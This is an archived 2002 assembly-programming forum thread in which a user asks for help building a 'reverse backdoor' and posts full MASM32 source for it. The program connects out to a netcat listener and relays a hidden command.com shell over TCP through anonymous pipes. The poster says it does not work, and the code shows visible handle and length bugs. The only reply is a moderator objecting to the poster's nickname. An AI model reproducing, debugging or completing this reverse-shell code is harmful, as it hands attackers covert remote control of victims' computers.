<!DOCTYPE html>
<html>
 <head>
  <meta charset="utf-8" />
  <title>Using pipes - Forums - ASM Community</title>
  <link rel="stylesheet" type="text/css" href="../../../style.css" />
  <link rel="canonical" href="../?id=3529" />
     </head>
 <body>
  <div id="header">
   <h1><a href="../../../">ASM Community</a></h1>
  </div>
  <div id="content">
   <p class="breadcrumbs"><a href="../../../">Home</a> &raquo; <a href="../../">Forums</a> &raquo; <a href="../../board/?id=3">MAIN</a> &raquo; <a href="../?id=3529">Using pipes</a></p>
   <div class="post" id="post-23433">
    <div class="subject"><a href="#post-23433">Using pipes</a></div>
    <div class="body">Hi, I'm trying to create a program that connects to<br />a listening program e.g. netcat over tcp and displays a command.com shell on it. A bit like a reverse backdoor.<br />I tried to do it like this:<br />create a socket, connect it to the netcat server,<br />start 2 threads, they both create an anonymous pipe,<br />but one only uses the write handle to write commands<br />to command.com that it recv's from the socket.<br />The other one constantly uses its read handle to read<br />from command.com and puts it on the socket.<br />After these threads are started I createprocess<br />command.com with the pipe handles.<br />Then I make the main thread wait forever and let the<br />2 worker threads to their stuff.<br />It's really simply but it doesn't work. The only thing<br />I soft ice tells me is that the readfile call that's supposed<br />to retreive something like<br />&quot;Microsoft(R) Windows 98<br />   (C)Copyright Microsoft Corp 1981-1998.<br /><br />C:\WINDOWS\desktop&gt;&quot;<br />never returns...<br />I think that's the problem, but I don't know how to fix it.<br />I hope somebody more experienced can help me, I'd<br />really appreciate it. Greetz, Phr0zen</div>
    <div class="meta">Posted on 2002-02-08 13:59:40 by Phr0zen@mail.be</div>
   </div>
   <div class="post" id="post-23435">
    <div class="subject"><a href="#post-23435">Using pipes</a></div>
    <div class="body">I dunno your policies about posting sources, but maybe it could help  finding my prob...<br />I hope it doesn't look ****** up...<br /><br /><pre><code><br />.386<br />.model flat,stdcall<br />option casemap&#58;none<br />include \masm32\include\windows.inc<br />include \masm32\include\user32.inc<br />include \masm32\include\kernel32.inc<br />include \masm32\include\wsock32.inc<br />include \masm32\include\masm32.inc<br />includelib \masm32\lib\user32.lib<br />includelib \masm32\lib\kernel32.lib<br />includelib \masm32\lib\wsock32.lib<br />includelib \masm32\lib\masm32.lib<br /><br />SendStuff       PROTO &#58;dword<br />ReceiveStuff    PROTO &#58;dword<br /><br />.data<br />CreatePipeError db &quot;Error during pipe creation&quot;,0<br />CreateProcessError db &quot;Error during process creation&quot;,0<br />;thread1		db &quot;thread 1 started!&quot;,0<br />;thread2		db &quot;thread 2 started!&quot;,0<br />sockerror	db &quot;could not connect!&quot;,0<br />CommandLine db &quot;command.com&quot;,0<br />Port_s      db &quot;8887&quot;,0<br />IP          db &quot;127.0.0.1&quot;,0<br />flag1       db 0<br />flag2       db 0<br /><br />.data?<br />hRead       dd ?<br />hWrite      dd ?<br />startupinfo STARTUPINFO &lt;&gt;<br />pinfo       PROCESS_INFORMATION &lt;&gt;<br />wsadata     WSADATA &lt;&gt;<br />sock        dd ?<br />sin         sockaddr_in &lt;&gt;<br />Port        dd ?<br />threadid1   dd ?<br />threadid2   dd ?<br /><br />.code<br />start&#58;<br />    invoke WSAStartup,101h,addr wsadata<br />@@&#58;<br />    invoke socket,AF_INET,SOCK_STREAM,0<br />    .IF eax == INVALID_SOCKET<br />        jmp @B<br />    .ENDIF   <br />    mov sock,eax<br />    invoke atodw,addr Port_s<br />    mov Port,eax<br />    invoke htons,Port<br />    mov sin.sin_port,ax<br />    mov sin.sin_family,AF_INET<br />    invoke inet_addr,addr IP<br />    mov sin.sin_addr,eax<br />serror&#58;<br />    invoke connect,sock,addr sin,sizeof sin<br />    .if eax == SOCKET_ERROR<br />	invoke MessageBox, NULL, addr sockerror,addr sockerror, MB_OK<br />	jmp serror<br />    .endif<br />	invoke CreateThread,NULL,NULL,addr SendStuff,NULL,NULL,addr threadid1<br />	invoke CloseHandle, eax<br />	invoke CreateThread,NULL,NULL,addr ReceiveStuff,NULL,NULL,addr threadid2<br />	invoke CloseHandle, eax<br />@@&#58;<br />    invoke Sleep, 250<br />    mov al, flag1<br />    mov bl, flag2<br />    test al, bl<br />    jz @B	;wait till the threads to have launched their pipes<br />    mov startupinfo.cb,sizeof STARTUPINFO<br />    invoke GetStartupInfo,addr startupinfo<br />    mov eax, hWrite<br />    mov startupinfo.hStdOutput,eax<br />    mov startupinfo.hStdError,eax<br />    mov eax, hRead<br />    mov startupinfo.hStdInput,eax<br />    mov startupinfo.dwFlags,STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES<br />    mov startupinfo.wShowWindow,SW_HIDE<br />    invoke CreateProcess,NULL,addr CommandLine,NULL,NULL,TRUE,NULL,NULL,NULL,addr startupinfo,addr pinfo<br />    .if eax==NULL<br />        invoke MessageBox,NULL,addr CreateProcessError,addr CreateProcessError,MB_ICONERROR+MB_OK<br />    .else<br />@@&#58;<br />        invoke SleepEx, -1, FALSE<br />        jmp @B<br />    .endif<br />              <br />SendStuff PROC tsjing&#58;DWORD<br />    LOCAL bytesRead&#58;DWORD<br />    LOCAL bla&#58;DWORD<br />    LOCAL sat&#58;SECURITY_ATTRIBUTES<br />    LOCAL buffer&#91;1024&#93;&#58;BYTE<br />;	invoke MessageBox, NULL, addr thread1,addr thread1, MB_OK<br />    mov sat.nLength,sizeof SECURITY_ATTRIBUTES<br />    mov sat.lpSecurityDescriptor,NULL<br />    mov sat.bInheritHandle,TRUE<br />    invoke CreatePipe,addr hRead,addr bla,addr sat,NULL<br />    mov flag1, TRUE<br />readNsend&#58;<br />    invoke Sleep, 250<br />    invoke RtlZeroMemory,addr buffer,1024<br />    invoke ReadFile,hRead,addr buffer,1023,addr bytesRead,NULL<br />    .if eax != FALSE<br />        invoke send,sock,addr buffer,bytesRead,0<br />    .endif<br />    jmp readNsend<br />    ret<br />SendStuff ENDP<br /><br />ReceiveStuff PROC tsjang&#58;DWORD<br />    LOCAL bytesWritten&#58;DWORD<br />    LOCAL bla&#58;DWORD<br />    LOCAL sat&#58;SECURITY_ATTRIBUTES<br />    LOCAL buffer&#91;1024&#93;&#58;BYTE<br />    LOCAL bytesToWrite&#58;DWORD<br />;		invoke MessageBox, NULL, addr thread2,addr thread2, MB_OK<br />    mov sat.nLength,sizeof SECURITY_ATTRIBUTES<br />    mov sat.lpSecurityDescriptor,NULL<br />    mov sat.bInheritHandle,TRUE<br />    invoke CreatePipe,addr bla,addr hWrite,addr sat,NULL<br />    mov flag2, TRUE<br />receiveNwrite&#58;<br />    invoke Sleep, 250<br />    invoke RtlZeroMemory,addr buffer,sizeof buffer<br />    invoke recv,sock,addr buffer,sizeof buffer,0<br />    .if eax != NULL<br />        invoke WriteFile,hWrite,addr buffer,bytesToWrite,addr bytesWritten,NULL<br />    .endif<br />    jmp receiveNwrite<br />    ret<br />ReceiveStuff ENDP<br /><br />end start<br /></code></pre><br />Just added the formatting options so it was easier to read.</div>
    <div class="meta">Posted on 2002-02-08 14:01:58 by Phr0zen@mail.be</div>
   </div>
   <div class="post" id="post-23470">
    <div class="subject"><a href="#post-23470">Using pipes</a></div>
    <div class="body">Phr0zen,<br /><br />Don't use this nick in here again, someone may think the forum supports PC which it does not.<br /><br />Register with a nick that does not associate itself with any particular group.<br /><br />Regards,<br /><br /><a href="mailto:hutch@movsd.com">hutch@movsd.com</a></div>
    <div class="meta">Posted on 2002-02-08 18:22:19 by hutch--</div>
   </div>
  </div>
 </body>
</html>